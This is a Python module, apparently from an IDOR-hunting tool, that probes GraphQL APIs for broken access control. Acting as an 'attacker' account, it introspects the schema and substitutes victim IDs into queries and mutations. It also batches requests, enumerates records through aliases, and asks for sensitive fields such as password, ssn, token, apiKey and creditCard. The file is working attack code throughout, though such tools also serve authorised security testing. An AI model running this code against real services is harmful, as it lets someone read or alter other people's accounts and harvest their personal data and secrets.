"""
AGI-idor GraphQL Analyzer — Introspection, mutation IDOR testing,
batch queries, alias enumeration, and fragment abuse.
"""
from __future__ import annotations
import json, logging, time
from pathlib import Path
from typing import Any, Optional
from colorama import Fore, Style
from utils.http_client import RotatingHTTPClient
from utils.diff_engine import DiffEngine
from core.auth_matrix import AuthMatrix

logger = logging.getLogger("agi-idor.graphql")

INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { fields { name description args { name type { name kind ofType { name kind } } } } }
    mutationType { fields { name description args { name type { name kind ofType { name kind } } } } }
    types { name kind fields { name type { name kind ofType { name kind } } args { name type { name kind ofType { name kind } } } } }
  }
}
"""

class GraphQLAnalyzer:
    def __init__(self, target_config: dict, http_client: RotatingHTTPClient, auth_matrix: AuthMatrix):
        self.config = target_config
        self.http = http_client
        self.auth = auth_matrix
        self.diff = DiffEngine()
        self.schema: Optional[dict] = None
        self.id_operations: list[dict] = []
        self.findings: list[dict] = []
        self.graphql_url = ""
        for doc in target_config.get("api_docs", []):
            if "graphql" in doc.lower():
                self.graphql_url = doc
                break
        if not self.graphql_url:
            self.graphql_url = f"{target_config.get('base_url', '')}/graphql"

    def introspect_schema(self) -> dict:
        """Run full introspection query."""
        self.auth.switch_account("attacker")
        try:
            resp = self.http.post(self.graphql_url, json={"query": INTROSPECTION_QUERY})
            if resp.status_code == 200:
                self.schema = resp.json()
                Path("output").mkdir(exist_ok=True)
                with open("output/graphql_schema.json", "w") as f:
                    json.dump(self.schema, f, indent=2)
                print(f"{Fore.GREEN}[GQL] Introspection successful{Style.RESET_ALL}")
                return self.schema
            else:
                print(f"{Fore.YELLOW}[GQL] Introspection returned {resp.status_code} (may be disabled){Style.RESET_ALL}")
        except Exception as e:
            logger.error(f"Introspection failed: {e}")
        return {}

    def extract_id_operations(self) -> list[dict]:
        """Find all mutations/queries accepting ID-type arguments."""
        if not self.schema:
            self.introspect_schema()
        if not self.schema:
            return []
        ops = []
        data = self.schema.get("data", {}).get("__schema", {})
        for type_key, op_type in [("queryType", "query"), ("mutationType", "mutation")]:
            type_data = data.get(type_key, {})
            if not type_data: continue
            for field in type_data.get("fields", []):
                id_args = []
                for arg in field.get("args", []):
                    t = arg.get("type", {})
                    type_name = (t.get("name") or "").upper()
                    inner = t.get("ofType", {})
                    inner_name = ((inner or {}).get("name") or "").upper()
                    arg_name_lower = arg["name"].lower()
                    if "ID" in type_name or "ID" in inner_name or arg_name_lower.endswith("id") or arg_name_lower in ("id","uid","uuid"):
                        id_args.append(arg["name"])
                if id_args:
                    ops.append({
                        "name": field["name"], "type": op_type,
                        "id_args": id_args,
                        "all_args": [a["name"] for a in field.get("args", [])],
                        "description": field.get("description", ""),
                    })
        self.id_operations = ops
        print(f"{Fore.CYAN}[GQL] Found {len(ops)} operations with ID arguments{Style.RESET_ALL}")
        return ops

    def test_mutation_idor(self, operation: dict, victim_ids: list[str]) -> list[dict]:
        """Swap victim IDs into mutation variables."""
        results = []
        op_name = operation["name"]
        op_type = operation["type"]
        id_args = operation["id_args"]
        self.auth.switch_account("attacker")
        for vid in victim_ids:
            variables = {arg: vid for arg in id_args}
            args_decl = ", ".join(f"${a}: ID" for a in id_args)
            args_use = ", ".join(f"{a}: ${a}" for a in id_args)
            query = f'{op_type} Test({args_decl}) {{ {op_name}({args_use}) {{ id }} }}'
            try:
                resp = self.http.post(self.graphql_url, json={
                    "query": query, "variables": variables, "operationName": "Test"
                })
                body = resp.json() if resp.status_code == 200 else {}
                errors = body.get("errors", [])
                data = body.get("data", {})
                if resp.status_code == 200 and data and not errors:
                    finding = {
                        "type": f"GraphQL {op_type.title()} IDOR",
                        "severity": "High" if op_type == "mutation" else "Medium",
                        "operation": op_name, "victim_id": vid,
                        "id_args": id_args, "status_code": resp.status_code,
                        "response_data": str(data)[:500],
                        "confidence": "HIGH",
                    }
                    self.findings.append(finding)
                    results.append(finding)
                    print(f"{Fore.RED}[GQL IDOR] {op_type} {op_name} with ID={vid} → data returned!{Style.RESET_ALL}")
            except Exception as e:
                logger.debug(f"Mutation test failed: {e}")
        return results

    def test_batch_queries(self, operations: list[dict], ids: list[str]) -> list[dict]:
        """Send batch arrays of queries with different IDs."""
        results = []
        self.auth.switch_account("attacker")
        for op in operations:
            if op["type"] != "query": continue
            batch = []
            for vid in ids[:50]:
                variables = {arg: vid for arg in op["id_args"]}
                args_decl = ", ".join(f"${a}: ID" for a in op["id_args"])
                args_use = ", ".join(f"{a}: ${a}" for a in op["id_args"])
                query = f'query {{ {op["name"]}({args_use}) {{ id }} }}'
                batch.append({"query": query, "variables": variables})
            if not batch: continue
            try:
                resp = self.http.post(self.graphql_url, json=batch)
                if resp.status_code == 200:
                    body = resp.json()
                    if isinstance(body, list):
                        successes = sum(1 for r in body if r.get("data") and not r.get("errors"))
                        if successes > 0:
                            results.append({
                                "type": "GraphQL Batch IDOR",
                                "operation": op["name"],
                                "batch_size": len(batch),
                                "successes": successes,
                            })
                            print(f"{Fore.RED}[GQL BATCH] {op['name']}: {successes}/{len(batch)} succeeded{Style.RESET_ALL}")
            except Exception as e:
                logger.debug(f"Batch test failed: {e}")
        return results

    def test_alias_enumeration(self, operation: dict, id_range: range = range(1, 51)) -> list[dict]:
        """Single query with aliases: {u1: user(id:"1"){email} u2: ...}."""
        results = []
        self.auth.switch_account("attacker")
        op_name = operation["name"]
        id_args = operation["id_args"]
        if not id_args: return results
        primary_arg = id_args[0]
        aliases = []
        for i in id_range:
            aliases.append(f'r{i}: {op_name}({primary_arg}: "{i}") {{ id }}')
        query = "query { " + " ".join(aliases) + " }"
        try:
            resp = self.http.post(self.graphql_url, json={"query": query})
            if resp.status_code == 200:
                body = resp.json()
                data = body.get("data", {})
                non_null = {k: v for k, v in data.items() if v is not None} if data else {}
                if non_null:
                    results.append({
                        "type": "GraphQL Alias Enumeration",
                        "operation": op_name,
                        "aliases_tested": len(list(id_range)),
                        "results_returned": len(non_null),
                        "sample": dict(list(non_null.items())[:5]),
                    })
                    print(f"{Fore.RED}[GQL ALIAS] {op_name}: {len(non_null)} results via alias enum{Style.RESET_ALL}")
        except Exception as e:
            logger.debug(f"Alias enum failed: {e}")
        return results

    def test_fragment_abuse(self, operation: dict) -> list[dict]:
        """Try to access hidden fields via inline fragments."""
        results = []
        self.auth.switch_account("attacker")
        sensitive_fields = ["email", "phone", "ssn", "password", "secret", "token",
                           "creditCard", "address", "apiKey", "privateKey"]
        op_name = operation["name"]
        id_args = operation["id_args"]
        if not id_args: return results
        primary_arg = id_args[0]
        field_str = " ".join(sensitive_fields)
        query = f'query {{ {op_name}({primary_arg}: "1") {{ id {field_str} }} }}'
        try:
            resp = self.http.post(self.graphql_url, json={"query": query})
            if resp.status_code == 200:
                body = resp.json()
                data = body.get("data", {}).get(op_name, {})
                if data and isinstance(data, dict):
                    leaked = [f for f in sensitive_fields if data.get(f)]
                    if leaked:
                        results.append({
                            "type": "GraphQL Field Leak",
                            "operation": op_name,
                            "leaked_fields": leaked,
                        })
                        print(f"{Fore.RED}[GQL LEAK] {op_name} leaks: {leaked}{Style.RESET_ALL}")
        except Exception as e:
            logger.debug(f"Fragment abuse failed: {e}")
        return results

    def run_all_tests(self, victim_ids: Optional[list[str]] = None) -> list[dict]:
        """Orchestrate all GraphQL IDOR tests."""
        victim_ids = victim_ids or [str(i) for i in range(1, 21)]
        all_results = []
        if not self.id_operations:
            self.extract_id_operations()
        print(f"\n{Fore.CYAN}[GQL] Testing {len(self.id_operations)} GraphQL operations{Style.RESET_ALL}")
        for op in self.id_operations:
            all_results.extend(self.test_mutation_idor(op, victim_ids[:10]))
            all_results.extend(self.test_alias_enumeration(op))
            all_results.extend(self.test_fragment_abuse(op))
        if self.id_operations:
            queries = [op for op in self.id_operations if op["type"] == "query"]
            if queries:
                all_results.extend(self.test_batch_queries(queries, victim_ids))
        self.findings.extend(all_results)
        return all_results
